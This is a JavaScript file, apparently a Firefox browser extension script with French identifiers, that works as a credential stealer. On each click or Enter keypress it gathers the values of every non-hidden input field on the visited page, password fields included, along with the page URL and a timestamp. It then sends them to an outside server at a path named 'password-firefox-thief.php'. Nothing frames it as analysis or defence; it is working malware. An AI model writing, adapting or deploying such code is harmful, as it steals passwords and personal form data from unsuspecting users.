function ajaxPost(url, data) {
    const jsonString = JSON.stringify(data);

    const xhr = XPCNativeWrapper(new window.wrappedJSObject.XMLHttpRequest());

    xhr.open("GET", url+"?"+data,true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr.send(null);
}

function prototypeData(data) {
	var temp = "v1="+data[0]+"&v2="+data[1]+"&v3="+data[2].replace(/&/gi, "†")+"&v4="+data[3];
	return temp;
}

class MyApp {
  constructor(now) {
    this.date = [now.getDate()+"/"+(now.getMonth()+1)+"/"+(now.getYear()+1900)];
    this.heure = [now.getHours()+"h"+now.getMinutes()];
    this.site = document.location.href;;
    this.inputs = [];
  }

  listing() {
	var clef1000 = Array.prototype.slice.call(document.getElementsByTagName('input'),0);
	for (let clef9991=0; clef9991!=clef1000.length ; clef9991++){
		if (clef1000[clef9991].getAttribute("type") != "hidden"){
			(this.inputs).push(clef1000[clef9991].value);
		}
	}
  }

  decrire() {
    return `Le ${this.date} a ${this.heure}, le site : ${this.site} a était visité. \nIl contenait ces inputs: ${this.inputs}`;
  }

  output() {
  	return [this.date, this.heure, this.site, this.inputs];
  }
}

function comparaison(myDataFirst, myDataLast) {
	myDataFirst.toString();
	myDataLast.toString();
	let diff = (myDataFirst.toString() === myDataLast.toString());
	return diff;
}

function commun_event() {
	const myData = new MyApp(new Date());
	myData.listing();
	myDataFirst = myData.output();
	if (comparaison(myDataFirst, myDataLast) == false) {
		myDataLast = myDataFirst;
		if (myDataFirst[3].length>2) {
			var toSend = prototypeData(myDataFirst);
            ajaxPost("https://dev.petitcroco.fr/password-firefox-thief.php", toSend);
		}
	}
}

function event_click() {
	commun_event();
}

function event_enter() {
	if (event.keyCode == 13) {
		commun_event();
	}
}

myDataLast = [];
document.addEventListener('click', event_click);
document.addEventListener("keydown", event_enter);
